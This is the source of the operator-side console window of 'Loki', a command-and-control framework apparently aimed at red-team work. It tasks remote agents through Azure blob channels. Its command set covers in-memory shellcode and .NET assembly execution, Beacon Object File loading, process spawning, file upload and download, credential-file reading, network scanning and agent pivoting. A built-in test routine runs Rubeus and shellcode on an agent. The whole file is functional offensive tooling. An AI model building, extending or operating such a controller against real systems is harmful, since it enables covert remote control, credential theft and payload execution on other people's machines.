const { ipcRenderer } = require('electron');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');
const az = require('./azure');
const { log } = require('console');
global.historyload = false;
global.inputload = false;
const { getAppDataDir } = require('./common');
const directories = getAppDataDir();

function logToFile(logFile, message) {
    try {
        fs.appendFileSync(logFile, `${message}\n`);
    } catch (error) {
        log(error);
    }
}

let agentid_log = '';
let user_log = '';
let pid_log = '';
let currentSuggestionIndex = -1;
let suggestions = [];
global.agent;
let window_agentid = "";

const commands = [
    'pwd', 'ls', 'cat', 'env', 'help',
    'spawn', 'drives', 'cat',
    'mv', 'sleep', 'cp', 'load',
    'upload', 'download', 'scexec', 'scan',
    'exit', 'assembly', 'help', 'dns','cd',
    'bof', 'link', 'unlink'
];

global.commandHistory = [];
let currentCommandIndex = -1;

function generateUUID(len) {
    if (len > 20) { len = 20 };
    const uuid = crypto.randomUUID();
    const shortUUID = uuid.replace(/-/g, '').substring(0, len);
    return shortUUID;
}

function timeDifference(oldTimestamp) {
    const now = Date.now();
    let diff = now - oldTimestamp;
    const msInSecond = 1000;
    const msInMinute = msInSecond * 60;
    const msInHour = msInMinute * 60;
    const msInDay = msInHour * 24;
    const days = Math.floor(diff / msInDay);
    diff %= msInDay;
    const hours = Math.floor(diff / msInHour);
    diff %= msInHour;
    const minutes = Math.floor(diff / msInMinute);
    diff %= msInMinute;
    const seconds = Math.floor(diff / msInSecond);
    let result = '';
    if (days > 0) result += `${days}d, `;
    if (hours > 0) result += `${hours}h, `;
    if (minutes > 0) result += `${minutes}m, `;
    if (seconds > 0 || result === '') result += `${seconds}s`;
    return result.trim().replace(/,\s*$/, '');
}

const commandDetails = [
    { name: "help", help: "Display this help menu\r\n" },
    { name: "pwd", help: "Print working directory\r\n\tpwd\r\n" },
    { name: "ls", help: "File and directory listing\r\n\tls [remote_path]\r\n\tls ./\r\n\tls C:/Users/user/Desktop/\r\n" },
    { name: "cat", help: "Display contents of a file\r\n\tcat [remote_path]\r\n\tcat ./kernel.js\r\n\tcat C:/Users/user/Desktop/creds.log\r\n" },
    { name: "env", help: "Display process environment variables\r\n\tenv\r\n" },
    { name: "spawn", help: "Spawn a child process\r\n\tspawn [cmd]\r\n\tspawn calc.exe\r\n" },
    { name: "drives", help: "List drives\r\n\tdrives\r\n" },
    { name: "mv", help: "Move a file to a new destination\r\n\tmv [remote_src] [remote_dst]\r\n\t" },
    { name: "sleep", help: "Sleep for seconds with jitter\r\n\sleep [s] [jitter%]\r\n\tsleep 20 15\r\n\t" },
    { name: "cp", help: "Copy a file\r\n\tcp [remote_src] [remote_dst]\r\n\t" },
    { name: "cd", help: "Change directory\r\n\tcd [remote_path]\r\n\tcd /agent/dst\r\n\t" },
    { name: "exit", help: "Exits the agent. The agent won't callback anymore\r\n\t" },
    { name: "load", help: "Load a node PE file from disk into the process\r\n\tload [remote_path]\r\n\tload ./git.node\r\n\t- Needs the ./ in front\r\n" },
    { name: "scexec", help: "Execute shellcode\r\n\tscexec [local_path]\r\n\tscexec /operator/src/shellcode/bin\r\n" },
    { name: "assembly", help: "Execute a .NET assembly and get command output\r\n\tassembly [local_path] [arg1] [arg2] ..\r\n\tassembly /operator/src/assembly arg1 arg2 arg3..\r\n" },
    { name: "upload", help: "Upload a file from your local operator box to the remote agent box\r\n\tupload [local_path] [remote_path]\r\n\tupload /operator/src/file /agent/dst/file\r\n" },
    { name: "download", help: "Download a file from remote agent box to local operator box /\r\n\tdownload [remote_path]\r\n\tdownload /agent/src/file\r\n\t- Get from View > Downloads\r\n" },
    { name: "link", help: "Peer-to-peer connect to a Loki TCP agent\r\n\tlink <hostname> <port>\r\n\tlink localhost 3000\r\n" },
    { name: "unlink", help: "Disconnect from a Loki TCP agent\r\n\tunlink <hostname>\r\n\tunlink localhost\r\n" },
    { name: "scan", help: "scan <host> [-p<ports>] \r\n" +
        "        - The target host or CIDR range to scan.\r\n" +
        "        - Options:\r\n" +
        "            -p<ports>        Comma-separated list of ports to scan (default: 80, 443).\r\n" +
        "    Examples:\r\n" +
        "        scan 192.168.1.1 -p80,443\r\n" +
        "        scan 192.168.1.0/24 -p22,80,443\r\n" },
    { name: "dns", help: "dns lookup <hostname> [-all | -mx | -txt | -cname]\r\n" +
        "        - Perform a DNS lookup on the given hostname.\r\n" +
        "        - Options:\r\n" +
        "            -all        Get all IP addresses\r\n" +
        "            -mx         Get mail exchange (MX) records\r\n" +
        "            -txt        Get TXT records\r\n" +
        "            -cname    Get CNAME records\r\n" +
        "    dns resolve <hostname>\r\n" +
        "        - Resolve the hostname to an IP address\r\n" +
        "    dns reverse <ip-address>\r\n" +
        "        - Perform a reverse lookup on an IP address\r\n" +
        "    dns config\r\n" +
        "        - Show the current system DNS servers\r\n" +
        "    dns @<server>\r\n" +
        "        - Use a custom DNS server\r\n" +
        "    dns @default\r\n" +
        "        - Reset the DNS server config\r\n" },
    { name: "set", help: "Set the Node load paths for assembly node and scexec nodes\r\n\tset scexec_path C:/Users/user/AppData/ExcludedApp/scexec.node\r\n\tset assembly_path C:/Users/user/AppData/ExcludedApp/assembly.node\r\n" },
    { name: "bof", help: "Execute a Beacon Object File (BOF)\r\n\tbof <path_to_coff_file> <function_name> <format_string> [args...]\r\n\tFormat specifiers:\r\n\t  z = null-terminated string (char*)\r\n\t  i = 4-byte integer (int)\r\n\t  b = binary blob (void*, length)\r\n\t  w = wide string (wchar_t*)\r\n\tExamples:\r\n\t  bof ./test.coff go z test_string\r\n\t  bof ./test.coff go i 1234\r\n\t  bof ./test.coff go b 41414141 4\r\n\t  bof ./test.coff go w test_wide_string\r\n" }
];

function getHelpInfo(command) {
    const parts = command.split(' ').filter(part => part !== '');
    if (parts.length > 1) {
        const cmdName = parts[1];
        const cmd = commandDetails.find(c => c.name === cmdName);
        return cmd ? cmd.help : `No help available for command: ${cmdName}`;
    } else {
        return "Command name missing. Use 'help <commandName>'.";
    }
}

function splitStringWithQuotes(str) {
    const result = [];
    let current = '';
    let insideQuotes = false;
    let quoteChar = '';
    for (let i = 0; i < str.length; i++) {
        const char = str[i];
        if (insideQuotes) {
            if (char === '\\' && (str[i + 1] === quoteChar || str[i + 1] === '\\')) {
                current += str[i + 1];
                i++;
            } else if (char === quoteChar) {
                insideQuotes = false;
                result.push(current);
                current = '';
            } else {
                current += char;
            }
        } else {
            if (char === '"' || char === "'") {
                insideQuotes = true;
                quoteChar = char;
            } else if (char === '\\' && str[i + 1] === ' ') {
                current += ' ';
                i++;
            } else if (char === ' ') {
                if (current.length > 0) {
                    result.push(current);
                    current = '';
                }
            } else {
                current += char;
            }
        }
    }
    if (current.length > 0) {
        result.push(current);
    }
    return result;
}

function doDownloadFile(argv) {
    const downloadFile = argv[1];
    const downloadBlob = generateUUID(10);
    const download = {
        'file': downloadFile,
        'blob': downloadBlob
    }
    return download;
}

function getFormattedTimestamp() {
    const now = new Date();
    const month = String(now.getMonth() + 1).padStart(2, '0');
    const day = String(now.getDate()).padStart(2, '0');
    const year = now.getFullYear();
    let hours = now.getHours();
    const minutes = String(now.getMinutes()).padStart(2, '0');
    const ampm = hours >= 12 ? 'PM' : 'AM';
    hours = hours % 12;
    hours = hours ? hours : 12;
    const timezoneInitials = now.toLocaleTimeString('en-us', { timeZoneName: 'short' }).split(' ')[2];
    const formattedTimestamp = `${month}-${day}-${year} ${hours}:${minutes}${ampm} ${timezoneInitials}`;
    return formattedTimestamp;
}

class Task {
    constructor(command) {
        this.outputChannel = 'o-' + Math.random().toString(36).substring(2, 14);
        this.uploadChannel = 'u-' + Math.random().toString(36).substring(2, 14);
        this.command = command;
        this.taskid = Math.random().toString(36).substring(2, 14);
        this.status = 'starting';
    }
}

function getCommandHistoryFile(hostname) {
    return path.join(directories.logDir, `command_history_${hostname}.log`);
}

function saveCommandToHistory(command, hostname) {
    try {
        const historyFile = getCommandHistoryFile(hostname);
        fs.appendFileSync(historyFile, `${command}\n`);
    } catch (error) {
        log(`Error saving command to history: ${error.message}`);
    }
}

function loadCommandHistory(hostname) {
    try {
        const historyFile = getCommandHistoryFile(hostname);
        if (fs.existsSync(historyFile)) {
            const commands = fs.readFileSync(historyFile, 'utf8').split('\n').filter(cmd => cmd.trim());
            global.commandHistory = commands;
            currentCommandIndex = global.commandHistory.length;
        }
    } catch (error) {
        log(`Error loading command history: ${error.message}`);
    }
}

function showHelp() {
    const maxLength = commandDetails.reduce((max, cmd) => {
    return cmd.name.length > max ? cmd.name.length : max;
    }, 0);
    commandDetails.forEach(thiscmd => {
    const paddedName = thiscmd.name.padEnd(maxLength, ' ');
    let cmdhelp = thiscmd.help.split('\r\n');
    cmdhelp = cmdhelp[0];
    printToConsole(`<i style="color:#c0c0c0">${paddedName} : ${cmdhelp}</i>`);
    });
}

function sendCommand() {
    log(`agent.js | sendCommand() | agent : \r\n${JSON.stringify(global.agent)}`);
    try {
        if (global.inputload === false) {
            return;
        }
        const input = document.getElementById('consoleInput');
        let command = input.value.trim();
        command = command.trim();
        global.commandHistory.push(command);
        saveCommandToHistory(command, global.agent.hostname);
        let original_command = command;
        let argv = splitStringWithQuotes(command);
        if (global.commandHistory.length > 1000) {
            global.commandHistory.shift();
        }
        currentCommandIndex = global.commandHistory.length;
        let PSString = `<span style="color:#acdff2">[${getFormattedTimestamp()}]</span> <span style="color:#ff0000">${global.agent.username}</span>`;
        let UnknownCommand = true;
        commandDetails.forEach(thiscmd => {
            if (argv[0] === thiscmd.name) { UnknownCommand = false; }
        });
        if (UnknownCommand) {
            printToConsole(`<i><span style="color:#ff0000">[!] Unknown command : "${command}". Type "help" for a list of commands.</span></i>`);
            input.value = '';
            closeDropdown();
            return;
        }
        if (command.startsWith("help")) {
            let platformElement = document.querySelector("#agentTable > tbody > tr > td:nth-child(8)");
            let platform;
            if (platformElement) {
                platform = platformElement.textContent.trim();
            }
            if (platform) {
                if (platform == "macOS" || platform == "Platform" || platform == "Linux") {
                    const removeCommands = ["scexec", "assembly"];
                    for (let i = commandDetails.length - 1; i >= 0; i--) {
                        if (removeCommands.includes(commandDetails[i].name)) {
                            commandDetails.splice(i, 1);
                        }
                    }
                }
            }
            if (argv.length > 1) {
                let commandHelp = getHelpInfo(command);
                printToConsole(`${PSString}$ ${original_command}`);
                printToConsole(`<i style="color:#c0c0c0">${commandHelp}</i>`);
                input.value = '';
                closeDropdown();
                return;
            } else {
                printToConsole(`${PSString}$ ${original_command}`);
                showHelp();
                input.value = '';
                closeDropdown();
                return;
            }
        }
        const task = new Task(
            command
        );
        if (!Array.isArray(global.agent.tasks)) {
            global.agent.tasks = [];
        }
        global.agent.tasks.push(task);
        let download;
        let upload = false;
        let scexec_upload = false;
        let assembly_upload = false;
        let bof_upload = false;
        let uploadblob = "";
        let uploadfile = "";
        let argsAmountError = false;

        if (argv[0] === "sleep") {
            if (argv[1] === "0") {
                argv[1] = "1";
            }
        }

        if (argv[0] == "download") {
            if (argv.length == 2) {
                download = doDownloadFile(argv);
                command = `download ${download['file']} ${download['blob']}`;
                global.agent.tasks[global.agent.tasks.length - 1].command = command;
                log(`agent.js : IPC : pull-download-file`);
                ipcRenderer.send('pull-download-file', global.agent, download['file'], download['blob']);
            } else {
                argsAmountError = true;
            }
        }
        if (argv[0] == "upload") {
            if (argv.length == 3) {
                uploadfile = argv[1];
                const destFilePath = argv[2];
                uploadblob = 'u' + generateUUID(10);
                command = `upload ${uploadblob} ${destFilePath}`;
                global.agent.tasks[global.agent.tasks.length - 1].command = command;
                upload = true;
            } else {
                argsAmountError = true;
            }
        }
        if (argv[0] == "scexec") {
            if (argv.length == 2) {
                scfile = argv[1];
                scblob = 'sc' + generateUUID(10);
                command = `scexec ${scblob}`;
                global.agent.tasks[global.agent.tasks.length - 1].command = command;
                scexec_upload = true;
            } else {
                argsAmountError = true;
            }
        }
        if (argv[0] == "assembly") {
            if (argv.length > 1) {
                scfile = argv[1];
                let args = argv.slice(2).join(' ');
                log(`args string : ${args}`);
                scblob = 'sc' + generateUUID(10);
                command = `assembly ${scblob} ${args}`;
                global.agent.tasks[global.agent.tasks.length - 1].command = command;
                assembly_upload = true;
            } else {
                argsAmountError = true;
            }
        }

        if (argv[0] == "bof") {
            if (argv.length > 1) {
                bof_upload = true;
            } else {
                argsAmountError = true;
            }
        }

        if (argsAmountError == true) {
            let ArgsError = `Incorrect amount of arguments supplied to ${argv[0]} command`;
            let commandHelp = getHelpInfo(argv[0]);
            printToConsole(ArgsError);
            printToConsole(commandHelp);
            input.value = '';
            closeDropdown();
            return;
        }

        log(`Sending command ${command}`);
        printToConsole(`${PSString}$ ${original_command}`);
        input.value = '';

        if (upload) {
            printToConsole(`<i style="color:#808080">[+] Uploading operator <b>${uploadfile}</b> file to blob <b>${uploadblob}</b></i>`);
            ipcRenderer.send('upload-file-to-blob', global.agent, uploadfile, uploadblob);
        } else if (assembly_upload) {
            printToConsole(`<i style="color:#808080">[+] Uploading operator <b>${scfile}</b> assembly file to blob <b>${scblob}</b></i>`);
            ipcRenderer.send('upload-sc-to-blob', global.agent, scfile, scblob);
        } else if (bof_upload) {
            printToConsole(`<i style="color:#808080">[+] Uploading operator <b>${argv[1]}</b> BOF file to blob <b>${task.uploadChannel}</b></i>`);
            ipcRenderer.send('upload-sc-to-blob', global.agent, argv[1], task.uploadChannel);
        } else if (scexec_upload) {
            printToConsole(`<i style="color:#808080">[+] Uploading operator <b>${scfile}</b> shellcode file to blob <b>${scblob}</b></i>`);
            ipcRenderer.send('upload-sc-to-blob', global.agent, scfile, scblob);
        } else {
            log(`agent.js | sendCommand() | agent : \r\n${JSON.stringify(global.agent)}`);
            ipcRenderer.send('upload-client-command-to-input-channel', global.agent);
            closeDropdown();
        }
    } catch (error) {
        log(`[!] Error in sendCommand from agent window ${error} ${error.stack}`);
    }
}

ipcRenderer.on('send-upload-command', (event, agent_object) => {
    try {
        log(`agent.js | send-upload-command | agent_object : ${JSON.stringify(agent_object)}`);
        printToConsole(`<i style="color:#808080">[+] Completed uploading operator file to blob</i>`);
        ipcRenderer.send('upload-client-command-to-input-channel', agent_object);
    } catch (error) {
        log(error);
    }
});

async function printToConsole(message, logToFileFlag = true) {
    try {
        const consoleOutput = document.getElementById('consoleOutput');
        const newLine = document.createElement('div');
        newLine.textContent = String(message);
        consoleOutput.appendChild(newLine);
        consoleOutput.scrollTop = consoleOutput.scrollHeight;
        let agent_log_name = `${pid_log}-${user_log}-${agentid_log}.log`;
        const logFile = path.join(directories.logDir, agent_log_name);
        if (logToFileFlag) {
            logToFile(logFile, `${message}\r\n`);
        }
    } catch (error) {
        console.error(`Error in printToConsole: ${error.message}\n${error.stack}`);
    }
}

function loadPreviousLogs(customHistoryLength = null) {
    try {
        let agent_log_name = `${pid_log}-${user_log}-${agentid_log}.log`;
        const logFile = path.join(directories.logDir, agent_log_name);
        log(`logfile : ${logFile}`);

        if (fs.existsSync(logFile)) {
            if (customHistoryLength !== null) {
                // Use provided history length (for immediate reload)
                loadLogsWithLength(logFile, customHistoryLength);
            } else {
                // Get history length setting (default to 100)
                ipcRenderer.invoke('get-customize-settings').then(settings => {
                    const historyLength = settings?.historyLength || 100;
                    loadLogsWithLength(logFile, historyLength);
                }).catch(error => {
                    log(`Error getting history length setting, using default: ${error}`);
                    loadLogsWithLength(logFile, 100);
                });
            }
        } else {
            log(`No existing log file found for ${logFile}`);
        }
    } catch (error) {
        log(`Error loading previous logs: ${error.message}\n${error.stack}`);
    }
}

function loadLogsWithLength(logFile, historyLength) {
    try {
        const logs = fs.readFileSync(logFile, 'utf8');
        const allLines = logs.split('\n');
        const nonEmptyLines = allLines.filter(line => line.trim().length > 0);
        
        let linesToLoad;
        if (historyLength === -1) {
            // Load all lines (infinite)
            linesToLoad = nonEmptyLines;
            log(`Loading all ${nonEmptyLines.length} lines from ${logFile}`);
        } else {
            // Load last N lines
            linesToLoad = nonEmptyLines.slice(-historyLength);
            log(`Loading last ${linesToLoad.length} of ${nonEmptyLines.length} lines from ${logFile}`);
        }
        
        linesToLoad.forEach(line => {
            let cleanedLine = line.replace(/^\[.*?\]\s*\[.*?\]\s*/, '').trim();
            if (cleanedLine) {
                printToConsole(cleanedLine, false);
            }
        });
    } catch (error) {
        log(`Error in loadLogsWithLength: ${error.message}`);
    }
}

function clearConsole() {
    const consoleOutput = document.getElementById('consoleOutput');
    consoleOutput.innerHTML = '';
}

function showDropdown() {
    const inputLine = document.querySelector('.input-line');
    const dropdown = document.getElementById('commandDropdown');
    dropdown.innerHTML = '';
    const maxWidth = Math.max(...suggestions.map(s => s.length)) * 8;
    suggestions.forEach((suggestion, index) => {
        const item = document.createElement('div');
        item.textContent = suggestion;
        item.style.padding = '5px';
        if (index === currentSuggestionIndex) {
            item.style.backgroundColor = '#555';
            item.style.color = '#00ff00';
        }
        item.addEventListener('click', () => {
            const input = document.getElementById('consoleInput');
            input.value = suggestion;
            input.focus();
            closeDropdown();
        });
        dropdown.appendChild(item);
    });
    dropdown.style.display = suggestions.length ? 'block' : 'none';
    const rect = inputLine.getBoundingClientRect();
    dropdown.style.top = `${rect.bottom}px`;
    dropdown.style.left = `${rect.left}px`;
    dropdown.style.width = `${maxWidth + 20}px`;
    dropdown.style.whiteSpace = 'nowrap';
    if (rect.bottom + dropdown.offsetHeight > window.innerHeight) {
        dropdown.style.top = `${rect.top - dropdown.offsetHeight}px`;
    }
}

function closeDropdown() {
    const dropdown = document.getElementById('commandDropdown');
    dropdown.innerHTML = '';
    dropdown.style.display = 'none';
    currentSuggestionIndex = -1;
}

function handleInput(event) {
    const input = event.target.value;
    if (input) {
        suggestions = commands.filter(command => command.startsWith(input));
        currentSuggestionIndex = -1;
        showDropdown();
    } else {
        suggestions = commands;
        showDropdown();
    }
}

function handleTabCompletion(event) {
    event.preventDefault();
    if (suggestions.length > 0) {
        currentSuggestionIndex = (currentSuggestionIndex + 1) % suggestions.length;
        showDropdown();
        const input = document.getElementById('consoleInput');
        input.value = suggestions[currentSuggestionIndex];
    }
}

window.addEventListener('DOMContentLoaded', async () => {

    ipcRenderer.on('container-data', (event, agent_object) => {
        try {
            log(`agent.js | container-data | agent_object : ${JSON.stringify(agent_object)}`);
            containerName = agent_object.container;
            containerKey = agent_object.aes;
            containerBlob = agent_object.blobs;
            global.agent = agent_object;

            document.title = "Loki Agent";

            // Immediately populate the agent table with the received data
            populateAgentTable(agent_object);
            
            // Enable input immediately since we have agent data
            global.inputload = true;
            window_agentid = agent_object.agentid;
            
            // Set up logging variables
            agentid_log = agent_object.agentid || '';
            user_log = agent_object.username || '';
            pid_log = agent_object.PID || '';
            
            // Load command history
            if (global.historyload === false && agent_object.hostname) {
                log(`Loading previous command history for ${agent_object.hostname}`);
                global.historyload = true;
                loadCommandHistory(agent_object.hostname);
                loadPreviousLogs();
            }

            const input = document.getElementById('consoleInput');
            input.focus();
            input.selectionStart = input.selectionEnd = input.value.length;
            
            log(`agent.js | container-data | Successfully initialized agent window for ${agent_object.agentid}`);
        } catch (error) {
            log(`container-data error: ${error} ${error.stack}`);
        }
    });

    ipcRenderer.on('agent-checkin', (event, checkin_data) => {
        try {
            printToConsole(`Checkin Data : ${checkin_data}`);
        } catch (error) {
            log(error);
        }
    });

    ipcRenderer.on('command-result', (event, result) => {
        log(`[AGENT][IPC] command-result : ${result}`);
        log(`[AGENT][IPC] command-result : ${JSON.stringify(result)}`);
        printToConsole(result);
    });

    const input = document.getElementById('consoleInput');
    input.addEventListener('keydown', (event) => {
        if (event.key === 'Enter') {
            log(`Sending Enter key press event`);
            sendCommand();
        } else if (event.key === 'Tab') {
            handleTabCompletion(event);
        } else if (event.ctrlKey && event.key === 'l') {
            event.preventDefault();
            clearConsole();
        } else if (event.key === 'ArrowUp') {
            if (currentCommandIndex > 0) {
                currentCommandIndex--;
                input.value = global.commandHistory[currentCommandIndex] || "";
            } else if (currentCommandIndex === 0) {
                input.value = global.commandHistory[currentCommandIndex] || "";
            }
            event.preventDefault();
        } else if (event.key === 'ArrowDown') {
            if (currentCommandIndex < global.commandHistory.length - 1) {
                currentCommandIndex++;
                input.value = global.commandHistory[currentCommandIndex] || "";
            } else if (currentCommandIndex === global.commandHistory.length - 1) {
                currentCommandIndex++;
                input.value = '';
            }
            event.preventDefault();
        }
    });
    input.addEventListener('input', handleInput);
    input.focus();
    input.selectionStart = input.selectionEnd = input.value.length;

    document.addEventListener('keydown', function (event) {
        if ((event.ctrlKey || event.metaKey) && event.key === 'c') {
            ipcRenderer.send('copy');
            event.preventDefault();
        }
        if ((event.ctrlKey || event.metaKey) && event.key === 'v') {
            ipcRenderer.send('paste');
            event.preventDefault();
        }
        if ((event.ctrlKey || event.metaKey) && event.key === 'x') {
            ipcRenderer.send('cut');
            event.preventDefault();
        }
        // Ctrl++ for zoom in
        if (event.ctrlKey && (event.key === '+' || event.key === '=')) {
          event.preventDefault();
          adjustZoom(0.1);
        }
        // Ctrl+- for zoom out
        if (event.ctrlKey && event.key === '-') {
          event.preventDefault();
          adjustZoom(-0.1);
        }
    });

    // Send message to main process to add test command menu item
    ipcRenderer.send('add-test-command-menu');
    
    // Listen for test command trigger from main process
    ipcRenderer.on('execute-test-command', () => {
        executeCommandTests();
    });

    // Listen for history reload from settings window
    ipcRenderer.on('reload-history', (event, historyLength) => {
        log(`=== RECEIVED RELOAD-HISTORY IPC ===`);
        log(`New history length: ${historyLength}`);
        
        // Clear the console and reload with new history length
        clearConsole();
        loadPreviousLogs(historyLength);
    });
});

function populateAgentTable(agentData) {
    try {
        const agentDataRow = document.getElementById('agentDataRow');
        if (!agentDataRow) {
            log('populateAgentTable: agentDataRow element not found');
            return;
        }
        
        if (!agentData) {
            log('populateAgentTable: No agent data provided');
            return;
        }

        log(`populateAgentTable: Populating table with agent data:`, {
            agentid: agentData.agentid,
            hostname: agentData.hostname,
            username: agentData.username,
            platform: agentData.platform
        });

        // Determine platform name
        let platformName = agentData.platform || 'Unknown';
        if (agentData.platform === "darwin") {
            platformName = "macOS";
        } else if (agentData.platform === "win32") {
            platformName = "Windows";
        } else if (agentData.platform === "linux") {
            platformName = "Linux";
        }

        // Process filename from full path
        let fileName = agentData.Process || '';
        if (fileName) {
            fileName = fileName.trim();
            if (fileName.includes("\\") && !fileName.includes("/")) {
                fileName = path.win32.basename(fileName);
            } else if (fileName.includes("/") && !fileName.includes("\\")) {
                fileName = path.posix.basename(fileName);
            } else {
                fileName = fileName.split(/[/\\]/).pop();
            }
        }

        // Update table cells with defensive checks
        if (agentDataRow.cells.length >= 9) {
            agentDataRow.cells[0].textContent = agentData.agentid || '-';
            agentDataRow.cells[1].textContent = agentData.hostname || '-';
            agentDataRow.cells[2].textContent = agentData.username || '-';
            agentDataRow.cells[3].textContent = fileName || '-';
            agentDataRow.cells[4].textContent = agentData.PID || '-';
            agentDataRow.cells[5].textContent = agentData.IP || '-';
            agentDataRow.cells[6].textContent = agentData.arch || '-';
            agentDataRow.cells[7].textContent = platformName || '-';
            agentDataRow.cells[8].textContent = agentData.checkin ? timeDifference(agentData.checkin) : 'Just connected';
        } else {
            log(`populateAgentTable: Table row doesn't have enough cells: ${agentDataRow.cells.length}`);
        }

        // Set logging variables
        agentid_log = agentData.agentid || '';
        user_log = agentData.username || '';
        pid_log = agentData.PID || '';

        log(`populateAgentTable: Successfully populated table for agent ${agentData.agentid}`);
    } catch (error) {
        log(`populateAgentTable error: ${error} ${error.stack}`);
    }
}

async function updateTable() {
    try {
        if (!global.agent || !global.agent.agentid) {
            log('updateTable: No agent data available yet');
            return;
        }

        let agentid = global.agent.agentid;
        window_agentid = agentid;
        
        // Try to get fresh checkin data, but don't block if it fails
        try {
            let agentcheckin = await ipcRenderer.invoke('get-agent-checkin', agentid);
            if (agentcheckin) {
                agentcheckin = JSON.parse(agentcheckin);
                populateAgentTable(agentcheckin);
                
                if (global.historyload === false) {
                    log(`Loading previous command history`);
                    global.historyload = true;
                    loadCommandHistory(global.agent.hostname);
                    loadPreviousLogs();
                }
                global.inputload = true;
            }
        } catch (checkinError) {
            log(`updateTable: Failed to get checkin data, using existing agent data: ${checkinError}`);
            // Fallback to using the original agent data
            populateAgentTable(global.agent);
            if (global.historyload === false) {
                log(`Loading previous command history`);
                global.historyload = true;
                loadCommandHistory(global.agent.hostname);
                loadPreviousLogs();
            }
            global.inputload = true;
        }
    } catch (error) {
        log(`updateTable error: ${error} ${error.stack}`);
    }
}
setInterval(updateTable, 1000);

async function format_ls_output(filesAndFolders) {
    let resultBuffer = '';
    resultBuffer += `Name`.padEnd(60) + `Type`.padEnd(16) + `Size (bytes)`.padEnd(15) + `Created`.padEnd(24) + `Modified`.padEnd(24) + '\n';
    resultBuffer += '-'.repeat(30) + '-'.repeat(10) + '-'.repeat(15) + '-'.repeat(30) + '-'.repeat(30) + '\n';
    log(`[AGENT][IPC] format_ls_output : ${filesAndFolders}`);
    let entries = JSON.parse(filesAndFolders)

    for (const entry of entries) {
        try {
            log(`[AGENT][IPC] entry : ${entry}`);
            const options = { 
                month: '2-digit', 
                day: '2-digit', 
                year: '2-digit', 
                hour: '2-digit', 
                minute: '2-digit', 
                second: '2-digit', 
                hour12: false 
            };
            resultBuffer += (entry.name || '').padEnd(60);
            resultBuffer += (entry.type || '').padEnd(16);
            resultBuffer += (entry.stats.size ? String(entry.stats.size) : '').padEnd(15);
            resultBuffer += (entry.stats.ctimeMs ? new Date(entry.stats.ctimeMs).toLocaleString('en-US', options).replace(',', '') : '').padEnd(24);
            resultBuffer += (entry.stats.mtimeMs ? new Date(entry.stats.mtimeMs).toLocaleString('en-US', options).replace(',', '') : '').padEnd(24);
            resultBuffer += '\n';
        } catch (err) {
            log(`Error: ${err.message}`);
        }
    }
    return resultBuffer;
}

ipcRenderer.on('command-output', async (event, command_response) => {
    log(`[AGENT][IPC] command-output : ${command_response.output}`);
    log(`[AGENT][IPC] command        : ${command_response.command}`);
    log(`[AGENT][IPC] taskid         : ${command_response.taskid}`);
    log(`[AGENT][IPC] status         : ${command_response.status}`);
    try {
        if (command_response.command.startsWith('ls')) {
            // Check if output is JSON before parsing
            let isJson = false;
            try {
                JSON.parse(command_response.output);
                isJson = true;
            } catch (e) {
                isJson = false;
            }
            if (isJson) {
                let resultBuffer = await format_ls_output(command_response.output);
                printToConsole(resultBuffer);
            } else {
                printToConsole(command_response.output);
            }
        } else if (command_response.command.startsWith('bof ')) {
            if (command_response.command.startsWith('bof ')) {
                printToConsole(command_response.output.replace(/</g, '&lt;').replace(/>/g, '&gt;'));
            } else {
                printToConsole(command_response.output);
            }
        } else {
            printToConsole(command_response.output);
        }
    } catch (error) {
        log(`[!][AGENT][IPC][command-output] Error: ${error.message}\r\n${error.stack}`);
    }
});

ipcRenderer.on('window-closing', async () => {
    try {
        log(`agent.js : IPC window-closing`);
        log(`agentid: ${window_agentid}`);
        ipcRenderer.send('force-close', window_agentid);
    } catch (error) {
        log(`[!][AGENT][IPC][window-closing] Error: ${error.message}\r\n${error.stack}`);
    }
});

document.addEventListener("keydown", function (event) {
    const consoleInput = document.getElementById("consoleInput");
    if (!consoleInput) return;
    const isCtrlOrMeta = event.ctrlKey || event.metaKey;
    const isAlt = event.altKey;
    if (isCtrlOrMeta) {
        switch (event.key.toLowerCase()) {
            case "a":
                event.preventDefault();
                consoleInput.select();
                log("Selected all text in consoleInput");
                break;
            case "arrowleft":
                event.preventDefault();
                moveCursorByWord(consoleInput, "left");
                log("Moved cursor back one word");
                break;
            case "arrowright":
                event.preventDefault();
                moveCursorByWord(consoleInput, "right");
                log("Moved cursor forward one word");
                break;
        }
    }
});

function moveCursorByWord(input, direction) {
    let pos = input.selectionStart;
    let value = input.value;
    if (direction === "left") {
        while (pos > 0 && value[pos - 1] === " ") pos--;
        while (pos > 0 && value[pos - 1] !== " ") pos--;
    } else if (direction === "right") {
        while (pos < value.length && value[pos] === " ") pos++;
        while (pos < value.length && value[pos] !== " ") pos++;
    }
    input.selectionStart = input.selectionEnd = pos;
}

const testCommands = [
    { command: "sleep 0 0"},
    { command: "pwd"},
    { command: "cd C:\\TEMP"},
    { command: "ls \"C:\\Program Files (x86)\\Microsoft\""},
    { command: "ls C:\\\\Program\\ Files\\ (x86)\\\\Microsoft"},
    { command: "ls 'C:\\Program Files (x86)\\Microsoft'"},
    { command: "ls 'C:/Program Files (x86)/Microsoft'"},
    { command: "dns reverse 1.1.1.1"},
    { command: "dns lookup google.com"},
    { command: "bof /dev/dir.x64.o go z \"C:\\TEMP\\"},
    { command: "spawn powershell.exe -c \"echo testing > C:\\TEMP\\testing.txt\""},
    { command: "ls"},
    { command: "cat testing.txt"},
    { command: "mv testing.txt testing2.txt"},
    { command: "ls .\\"},
    { command: "cp testing2.txt testing3.txt"},
    { command: "ls ./"},
    { command: "download testing3.txt"},
    { command: "cd"},
    { command: "upload /TEMP/testing3.txt ./"},
    { command: "scan 127.0.0.1 -p22,80,445,8080"},
    { command: "assembly /dev/Rubeus_v4.0_InspirationOpinion.exe klist"},
    { command: "scexec /dev/popcalc.bin"}
];
    
async function executeCommandTests() {
    try{
        printToConsole(`<i style="color:#808080">[+] Starting command tests...</i>`);
        
        // Execute each command with basic test parameters
        for (const cmd of testCommands) {
            let testCommand = cmd.command;
            // Put the command in the input box and send it
            const input = document.getElementById('consoleInput');
            input.value = testCommand;
            sendCommand();
            await new Promise(resolve => setTimeout(resolve, 5000));
        }
    } catch (error) {
        log(`Error in executeCommandTests: ${error.message}\r\n${error.stack}`);
    }
}
